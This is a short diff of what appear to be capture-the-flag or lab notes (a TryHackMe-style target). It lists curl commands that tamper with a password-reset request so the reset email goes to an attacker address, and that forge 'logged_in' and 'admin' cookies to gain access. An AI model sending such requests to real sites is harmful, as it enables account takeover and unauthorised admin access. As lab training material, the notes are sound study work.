@@ -32,8 +32,7 @@
 # Curl
     curl 'http://10.10.54.22/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
     curl 'http://10.10.54.22/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
-    
-    
+ \n
     curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
     
     
